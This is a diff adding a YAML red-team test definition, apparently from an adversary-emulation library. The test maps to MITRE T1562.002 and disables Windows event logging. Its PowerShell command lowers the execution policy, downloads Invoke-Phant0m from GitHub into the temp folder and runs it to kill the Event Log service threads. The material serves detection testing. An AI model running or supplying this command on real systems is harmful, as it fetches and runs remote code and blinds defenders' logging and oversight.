@@ -1,0 +1,33 @@
+- id: 41ac52ba-5d5e-40c0-b267-573ed90489bd
+  name: Kill Event Log Service Threads
+  description: Kill Windows Event Log Service Threads using Invoke-Phant0m. WARNING
+    you will need to restart PC to return to normal state with Log Service. https://artofpwn.com/phant0m-killing-windows-event-log.html
+  tactic: defense-evasion
+  technique:
+    attack_id: T1562.002
+    name: 'Impair Defenses: Disable Windows Event Logging'
+  platforms:
+    windows:
+      psh:
+        command: Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned
+          -ErrorAction Ignore; $url = "https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1";
+          $output = "$env:TEMP\Invoke-Phant0m.ps1"; $wc = New-Object System.Net.WebClient;
+          $wc.DownloadFile($url, $output); cd $env:TEMP; Import-Module .\Invoke-Phant0m.ps1;
+          Invoke-Phant0m
+        cleanup: Write-Host "NEED TO Restart-Computer TO ENSURE LOGGING RETURNS" -fore
+          red; Remove-Item "$env:TEMP\Invoke-Phant0m.ps1" -ErrorAction Ignore
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1562.002
+  - atomic-red-team
+  - defense-evasion
+  author: Atomic Red Team
+  additional_info:
+    technique_created: '2020-02-21T20:46:36.688Z'
+    atomic_guid: 41ac52ba-5d5e-40c0-b267-573ed90489bd
+    import_timestamp: '2025-06-24T11:15:00.350005Z'
